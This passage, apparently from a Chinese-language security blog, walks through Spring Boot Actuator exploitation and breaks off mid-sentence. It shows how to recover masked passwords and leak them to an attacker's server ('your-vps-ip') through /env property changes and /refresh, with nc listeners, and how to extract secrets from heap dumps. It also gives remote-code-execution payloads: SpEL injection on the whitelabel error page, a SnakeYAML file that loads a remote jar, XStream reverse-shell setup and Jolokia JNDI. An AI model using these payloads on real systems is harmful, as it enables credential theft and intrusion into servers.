class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;EXEC&quot;</span>, <span class="hljs-string">&quot;arguments&quot;</span>: [<span class="hljs-string">&quot;security.user.password&quot;</span>]&#125;<br></code></pre></td></tr></table></figure><ul><li>调用其他 Mbean</li></ul><blockquote><p>目标具体情况和存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。</p></blockquote><h3 id="获取被星号脱敏的密码的明文-方法二"><a href="#获取被星号脱敏的密码的明文-方法二" class="headerlink" title="获取被星号脱敏的密码的明文 (方法二)"></a>获取被星号脱敏的密码的明文 (方法二)</h3><h4 id="利用条件：-1"><a href="#利用条件：-1" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 GET 请求目标网站的 <code>/env</code></li><li>可以 POST 请求目标网站的 <code>/env</code></li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标使用了 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖</li><li>目标可以请求攻击者的服务器（请求可出外网）</li></ul><h4 id="利用方法：-1"><a href="#利用方法：-1" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-找到想要获取的属性名-1"><a href="#步骤一：-找到想要获取的属性名-1" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p><h5 id="步骤二：-使用-nc-监听-HTTP-请求"><a href="#步骤二：-使用-nc-监听-HTTP-请求" class="headerlink" title="步骤二： 使用 nc 监听 HTTP 请求"></a>步骤二： 使用 nc 监听 HTTP 请求</h5><p>在自己控制的外网服务器上监听 80 端口：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvk 80<br></code></pre></td></tr></table></figure><h5 id="步骤三：-设置-eureka-client-serviceUrl-defaultZone-属性"><a href="#步骤三：-设置-eureka-client-serviceUrl-defaultZone-属性" class="headerlink" title="步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性"></a>步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性</h5><p>将下面 <code>http://value:$&#123;security.user.password&#125;@your-vps-ip</code> 中的 <code>security.user.password</code> 换成自己想要获取的对应的星号 * 遮掩的属性名；</p><p><code>your-vps-ip</code> 换成自己外网服务器的真实 ip 地址。</p><p>spring 1.x</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /env<br>Content-Type: application/x-www-form-urlencoded<br><br>eureka.client.serviceUrl.defaultZone=http://value:<span class="hljs-variable">$&#123;security.user.password&#125;</span>@your-vps-ip<br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix">POST <span class="hljs-symbol">/actuator/env</span><br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;eureka.client.serviceUrl.defaultZone&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;http://value:<span class="hljs-subst">$&#123;security.user.password&#125;</span>@your-vps-ip&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h5 id="步骤四：-刷新配置"><a href="#步骤四：-刷新配置" class="headerlink" title="步骤四： 刷新配置"></a>步骤四： 刷新配置</h5><p>spring 1.x</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">POST</span> /refresh<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">POST /actuator/<span class="hljs-keyword">refresh</span><br>Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">json</span><br></code></pre></td></tr></table></figure><h5 id="步骤五：-解码属性值"><a href="#步骤五：-解码属性值" class="headerlink" title="步骤五： 解码属性值"></a>步骤五： 解码属性值</h5><p>正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 <code>Authorization</code> 头内容：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Authorization:</span> Basic dmFsdWU6MTIzNDU2<br></code></pre></td></tr></table></figure><p>将其中的 <code>dmFsdWU6MTIzNDU2</code>部分使用 base64 解码，即可获得类似明文值 <code>value:123456</code>，其中的 <code>123456</code> 即是目标星号 * 脱敏前的属性值明文。</p><h3 id="获取被星号脱敏的密码的明文-方法三"><a href="#获取被星号脱敏的密码的明文-方法三" class="headerlink" title="获取被星号脱敏的密码的明文 (方法三)"></a>获取被星号脱敏的密码的明文 (方法三)</h3><h4 id="利用条件：-2"><a href="#利用条件：-2" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>通过 POST <code>/env</code> 设置属性触发目标对外网指定地址发起任意 http 请求</li><li>目标可以请求攻击者的服务器（请求可出外网）</li></ul><h4 id="利用方法：-2"><a href="#利用方法：-2" class="headerlink" title="利用方法："></a>利用方法：</h4><blockquote><p>参考 UUUUnotfound 提出的 <a href="https://github.com/LandGrey/SpringBootVulExploit/issues/1">issue-1</a>，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据</p></blockquote><h5 id="步骤一：-找到想要获取的属性名-2"><a href="#步骤一：-找到想要获取的属性名-2" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p><h5 id="步骤二：-使用-nc-监听-HTTP-请求-1"><a href="#步骤二：-使用-nc-监听-HTTP-请求-1" class="headerlink" title="步骤二： 使用 nc 监听 HTTP 请求"></a>步骤二： 使用 nc 监听 HTTP 请求</h5><p>在自己控制的外网服务器上监听 80 端口：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvk 80<br></code></pre></td></tr></table></figure><h5 id="步骤三：-触发对外-http-请求"><a href="#步骤三：-触发对外-http-请求" class="headerlink" title="步骤三： 触发对外 http 请求"></a>步骤三： 触发对外 http 请求</h5><ul><li><code>spring.cloud.bootstrap.location</code> 方法（<strong>同时适用于</strong>明文数据中有特殊 url 字符的情况）</li></ul><p>spring 1.x</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">POST /env<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-form-urlencoded<br><br>spring.cloud.bootstrap.<span class="hljs-keyword">location</span>=http://your-vps-ip/?=$&#123;<span class="hljs-keyword">security</span>.<span class="hljs-keyword">user</span>.<span class="hljs-keyword">password</span>&#125;<br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix">POST <span class="hljs-symbol">/actuator/env</span><br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;spring.cloud.bootstrap.location&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;http://your-vps-ip/?=<span class="hljs-subst">$&#123;security.user.password&#125;</span>&quot;</span>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>eureka.client.serviceUrl.defaultZone</code> 方法（<strong>不适用于</strong>明文数据中有特殊 url 字符的情况）</li></ul><p>spring 1.x</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /env<br>Content-Type: application/x-www-form-urlencoded<br><br>eureka.client.serviceUrl.defaultZone=http://your-vps-ip/<span class="hljs-variable">$&#123;security.user.password&#125;</span><br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix">POST <span class="hljs-symbol">/actuator/env</span><br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;eureka.client.serviceUrl.defaultZone&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;http://your-vps-ip/<span class="hljs-subst">$&#123;security.user.password&#125;</span>&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h5 id="步骤四：-刷新配置-1"><a href="#步骤四：-刷新配置-1" class="headerlink" title="步骤四： 刷新配置"></a>步骤四： 刷新配置</h5><p>spring 1.x</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">POST</span> /refresh<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">POST /actuator/<span class="hljs-keyword">refresh</span><br>Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">json</span><br></code></pre></td></tr></table></figure><h3 id="获取被星号脱敏的密码的明文-方法四"><a href="#获取被星号脱敏的密码的明文-方法四" class="headerlink" title="获取被星号脱敏的密码的明文 (方法四)"></a>获取被星号脱敏的密码的明文 (方法四)</h3><blockquote><p>访问 &#x2F;env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p></blockquote><h4 id="利用条件：-3"><a href="#利用条件：-3" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可正常 GET 请求目标 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口</li></ul><h4 id="利用方法：-3"><a href="#利用方法：-3" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-找到想要获取的属性名-3"><a href="#步骤一：-找到想要获取的属性名-3" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p><h5 id="步骤二：-下载-jvm-heap-信息"><a href="#步骤二：-下载-jvm-heap-信息" class="headerlink" title="步骤二： 下载 jvm heap 信息"></a>步骤二： 下载 jvm heap 信息</h5><blockquote><p>下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G</p></blockquote><p><code>GET</code> 请求目标的 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口，下载应用实时的 JVM 堆信息</p><h5 id="步骤三：-使用-MAT-获得-jvm-heap-中的密码明文"><a href="#步骤三：-使用-MAT-获得-jvm-heap-中的密码明文" class="headerlink" title="步骤三： 使用 MAT 获得 jvm heap 中的密码明文"></a>步骤三： 使用 MAT 获得 jvm heap 中的密码明文</h5><p>参考 <a href="https://landgrey.me/blog/16/">文章</a> 方法，使用 <a href="https://www.eclipse.org/mat/downloads.php">Eclipse Memory Analyzer</a> 工具的 <strong>OQL</strong> 语句</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> java.util.Hashtable$Entry x <span class="hljs-keyword">WHERE</span> (<span class="hljs-built_in">toString</span>(x.<span class="hljs-keyword">key</span>).<span class="hljs-built_in">contains</span>(<span class="hljs-string">&quot;password&quot;</span>))<br><br>或<br><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> java.util.LinkedHashMap$Entry x <span class="hljs-keyword">WHERE</span> (<span class="hljs-built_in">toString</span>(x.<span class="hljs-keyword">key</span>).<span class="hljs-built_in">contains</span>(<span class="hljs-string">&quot;password&quot;</span>))<br></code></pre></td></tr></table></figure><p>辅助用 “<strong>password</strong>“ 等关键词快速过滤分析，获得密码等相关敏感信息的明文。</p><h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><blockquote><p>由于 spring boot 相关漏洞可能是多个组件漏洞组合导致的，所以有些漏洞名字起的不太正规，以能区分为准</p></blockquote><h3 id="3-1-whitelabel-error-page-SpEL-RCE"><a href="#3-1-whitelabel-error-page-SpEL-RCE" class="headerlink" title="3.1 whitelabel error page SpEL RCE"></a>3.1 whitelabel error page SpEL RCE</h3><h4 id="利用条件：-4"><a href="#利用条件：-4" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</li><li>至少知道一个触发 springboot 默认错误页面的接口及参数名</li></ul><p><a href="https://img2024.cnblogs.com/blog/3310985/202501/3310985-20250121223205265-1974775435.png"><img src="https://img2024.cnblogs.com/blog/3310985/202501/3310985-20250121223205265-1974775435.png" alt="image"></a></p><h4 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>spring boot 处理参数值出错，流程进入 <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</li><li>此时 URL 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</li><li>其中 <code>$&#123;&#125;</code> 包围的内容都会被 <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的 <code>resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li></ol><h4 id="利用方法：-4"><a href="#利用方法：-4" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：找到一个正常传参处"><a href="#步骤一：找到一个正常传参处" class="headerlink" title="步骤一：找到一个正常传参处"></a>步骤一：找到一个正常传参处</h5><p>比如发现访问 <code>/article?id=xxx</code> ，页面会报状态码为 500 的错误： <code>Whitelabel Error Page</code>，则后续 payload 都将会在参数 id 处尝试。</p><h5 id="步骤二：执行-SpEL-表达式"><a href="#步骤二：执行-SpEL-表达式" class="headerlink" title="步骤二：执行 SpEL 表达式"></a>步骤二：执行 SpEL 表达式</h5><p>输入 <code>/article?id=$&#123;7*7&#125;</code> ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。</p><p>由字符串格式转换成 <code>0x**</code> java 字节形式，方便执行任意代码：</p><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding: utf-8</span><br><br>result = <span class="hljs-string">&quot;&quot;</span><br>target = <span class="hljs-string">&#x27;touch /tmp/success111&#x27;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> target:<br>    result += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(x)) + <span class="hljs-string">&quot;,&quot;</span><br><span class="hljs-built_in">print</span>(result.rstrip(<span class="hljs-string">&#x27;,&#x27;</span>))<br></code></pre></td></tr></table></figure><p>执行 <code>open -a Calculator</code> 命令</p><p>java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">0x74</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x2f</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x6d</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x2f</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x31</span>&#125;))&#125;<br></code></pre></td></tr></table></figure><p><a href="https://img2024.cnblogs.com/blog/3310985/202501/3310985-20250121223232237-904908855.png"><img src="https://img2024.cnblogs.com/blog/3310985/202501/3310985-20250121223232237-904908855.png" alt="image"></a></p><h4 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://119.8.60.88:9091/article?<span class="hljs-built_in">id</span>=<span class="hljs-variable">$&#123;6*6&#125;</span><br></code></pre></td></tr></table></figure><h3 id="3-2：spring-cloud-SnakeYAML-RCE"><a href="#3-2：spring-cloud-SnakeYAML-RCE" class="headerlink" title="3.2：spring cloud SnakeYAML RCE"></a>3.2：spring cloud SnakeYAML RCE</h3><h4 id="利用条件：-5"><a href="#利用条件：-5" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标依赖的 <code>spring-cloud-starter</code> 版本 &lt; 1.3.0.RELEASE</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li></ul><p>**SnakeYAML：**是一个Java库，用于解析和生成YAML文件。YAML是一种人类可读的数据序列化标准，广泛用于配置文件。</p><h4 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址</li><li>refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</li><li>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作</li><li>先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件</li><li>然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化</li><li>实例化类时执行恶意代码，造成 RCE 漏洞</li></ol><h4 id="利用方法：-5"><a href="#利用方法：-5" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-托管-yml-和-jar-文件"><a href="#步骤一：-托管-yml-和-jar-文件" class="headerlink" title="步骤一： 托管 yml 和 jar 文件"></a>步骤一： 托管 yml 和 jar 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 python 快速开启 http server</span><br><br>python2 -m SimpleHTTPServer 80<br>python3 -m http.server 80<br></code></pre></td></tr></table></figure><p>在网站根目录下放置后缀为 <code>yml</code> 的文件 <code>example.yml</code>，内容如下：</p><p>yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!!javax.script.ScriptEngineManager</span> [<br>  <span class="hljs-type">!!java.net.URLClassLoader</span> [[<br>    <span class="hljs-type">!!java.net.URL</span> [<span class="hljs-string">&quot;http://your-vps-ip/example.jar&quot;</span>]<br>  ]]<br>]<br></code></pre></td></tr></table></figure><p>在网站根目录下放置后缀为 <code>jar</code> 的文件 <code>example.jar</code>，内容是要执行的代码，代码编写及编译方式参考 <a href="https://github.com/artsploit/yaml-payload">yaml-payload</a>。</p><h5 id="步骤二：-设置-spring-cloud-bootstrap-location-属性"><a href="#步骤二：-设置-spring-cloud-bootstrap-location-属性" class="headerlink" title="步骤二： 设置 spring.cloud.bootstrap.location 属性"></a>步骤二： 设置 spring.cloud.bootstrap.location 属性</h5><p>spring 1.x</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">POST</span> /env<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br><br>spring.cloud.<span class="hljs-keyword">bootstrap</span>.location=http:<span class="hljs-comment">//your-vps-ip/example.yml</span><br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix">POST <span class="hljs-symbol">/actuator/env</span><br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;spring.cloud.bootstrap.location&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;http://your-vps-ip/example.yml&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h5 id="步骤三：-刷新配置"><a href="#步骤三：-刷新配置" class="headerlink" title="步骤三： 刷新配置"></a>步骤三： 刷新配置</h5><p>spring 1.x</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">POST</span> /refresh<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">POST /actuator/<span class="hljs-keyword">refresh</span><br>Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">json</span><br></code></pre></td></tr></table></figure><h3 id="3-3-eureka-xstream-deserialization-RCE"><a href="#3-3-eureka-xstream-deserialization-RCE" class="headerlink" title="3.3 eureka xstream deserialization RCE"></a>3.3 eureka xstream deserialization RCE</h3><h4 id="利用条件：-6"><a href="#利用条件：-6" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标使用的 <code>eureka-client</code> &lt; 1.8.7（通常包含在 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖中）</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li></ul><p>**XStream：**XStream是Java类库，用来将对象序列化成XML （JSON）或反序列化为对象。</p><p><strong>查看目标是否使用Spring Cloud Netflix:</strong></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//119.8.60.88:9090/env</span><br></code></pre></td></tr></table></figure><p><a href="https://img2024.cnblogs.com/blog/3310985/202501/3310985-20250121223257361-5202975.png"><img src="https://img2024.cnblogs.com/blog/3310985/202501/3310985-20250121223257361-5202975.png" alt="image"></a></p><h4 id="漏洞原理：-2"><a href="#漏洞原理：-2" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址</li><li>refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload</li><li>目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞</li></ol><h4 id="利用方法：-6"><a href="#利用方法：-6" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：架设响应恶意-XStream-payload-的网站"><a href="#步骤一：架设响应恶意-XStream-payload-的网站" class="headerlink" title="步骤一：架设响应恶意 XStream payload 的网站"></a>步骤一：架设响应恶意 XStream payload 的网站</h5><p>提供一个依赖 Flask 并符合要求的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py">python 脚本示例</a>，作用是利用目标 Linux 机器上自带的 python 来反弹shell。</p><p>使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。</p><h5 id="步骤二：监听反弹-shell-的端口"><a href="#步骤二：监听反弹-shell-的端口" class="headerlink" title="步骤二：监听反弹 shell 的端口"></a>步骤二：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 443<br></code></pre></td></tr></table></figure><h5 id="步骤三：设置-eureka-client-serviceUrl-defaultZone-属性"><a href="#步骤三：设置-eureka-client-serviceUrl-defaultZone-属性" class="headerlink" title="步骤三：设置 eureka.client.serviceUrl.defaultZone 属性"></a>步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</h5><p>spring 1.x</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">POST</span> /env<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br><br>eureka.client.serviceUrl.defaultZone=http:<span class="hljs-comment">//your-vps-ip/example</span><br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix">POST <span class="hljs-symbol">/actuator/env</span><br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;eureka.client.serviceUrl.defaultZone&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;http://your-vps-ip/example&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h5 id="步骤四：刷新配置"><a href="#步骤四：刷新配置" class="headerlink" title="步骤四：刷新配置"></a>步骤四：刷新配置</h5><p>spring 1.x</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">POST</span> /refresh<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">POST /actuator/<span class="hljs-keyword">refresh</span><br>Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">json</span><br></code></pre></td></tr></table></figure><h3 id="3-4-jolokia-logback-JNDI-RCE"><a href="#3-4-jolokia-logback-JNDI-RCE" class="headerlink" title="3.4 jolokia logback JNDI RCE"></a>3.4 jolokia logback JNDI RCE</h3><h4 id="利用条件：-7"><a href="#利用条件：-7" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li><li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li><li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1(LDAP)，但相关环境可绕过</li></ul><p><strong>Logback日志框架：</strong><br>Logback是一个高性能、灵活且可扩展的Java日志框架。<br>Logback支持通过JNDI（Java命名和目录接口）来加载外部配置文件。</p><h4 id="漏洞原理：-3"><a href="#漏洞原理：-3" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 类的 <code>reloadByURL</code> 方法</li><li>目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容</li><li>目标机器使用 saxParser.parse 